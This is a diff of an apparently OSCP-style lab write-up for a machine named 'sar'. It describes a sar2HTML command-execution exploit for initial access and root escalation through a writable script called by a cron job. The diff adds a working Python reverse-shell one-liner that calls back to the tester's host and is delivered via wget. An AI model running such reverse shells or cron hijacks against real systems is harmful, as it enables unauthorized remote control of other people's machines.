@@ -51,6 +51,9 @@ and finly we are root.
 
 # sar 192.168.239.89
 
+In this machine i did all the same steps as the first machine but in the step 
+<b>Web Enumeration </b> I didn't find any sensitive data i found only a diroctry to sar2HTML i check that dirocrty and i got a sar service runing on server i check if the version of sar if it expots and from explots db i can see there is a vournably i can use it to run shell code exuction as a revers shell what i did first i check ls command and whoaim after that i run server with nc lesing in my ip and port i provide and setablish a connection using a socket with help of python command finaly i have shell form the server I'm now as www-data user .
+
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.35.06.png)
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.35.46.png)
@@ -72,10 +75,11 @@ and finly we are root.
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.42.42.png)
 
 
-In this machine i did all the same steps as the first machine but in the step 
-<b>Web Enumeration </b> I didn't find any sensitive data i found only a diroctry to sar2HTML i check that dirocrty and i got a sar service runing on server i check if the version of sar if it expots and from explots db i can see there is a vournably i can use it to run shell code exuction as a revers shell what i did first i check ls command and whoaim after that i run server with nc lesing in my ip and port i provide and setablish a connection using a socket with help of python command finaly i have shell form the server I'm now as www-data user .
-
 ## Privilege Escalation
+
+In this machine also i check if there is any binary to use to escale privilage but unfornaty i did not fine any so i checked crontab i found there is a script called finally.sh run every 5 minit with root permition so find this script location i cat it and got that script called onther script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run somting for me as root by changing the write.sh so what i did i removed the write.sh from server i and i create new now in my machine with .
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.55.200",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+and run a http server from my machine and download it to the server using wget after that i changed permtion to make it exuxtbale bacause the finnaly script call write script with ./write it need permmtion to excyte now all i need to wait 5 minte to get revese shell with as root .
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.44.19.png)
 
@@ -92,5 +96,3 @@ In this machine i did all the same steps as the first machine but in the step
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2000.57.14.png)
 
 ![alt text](https://github.com/BleedTheFreak/oscp_report/blob/main/Screen%20Shot%202022-10-05%20at%2001.05.16.png)
-
-In this machine also i check if there is any binary to use to escale privilage but unfornaty i did not fine any so i checked crontab i found there is a script called finally.sh run every 5 minit with root permition so find this script location i cat it and got that script called onther script called write.sh but write.sh owned by www-data and finnaly.sh with root user so i can use this to make crontab run somting for me as root by changing the write.sh so what i did i removed the write.sh from server i and i create new now in my machine with `paython blabla` and run a http server from my machine and download it to the server using wget after that i changed permtion to make it exuxtbale bacause the finnaly script call write script with ./write it need permmtion to excyte now all i need to wait 5 minte to get revese shell with as root .
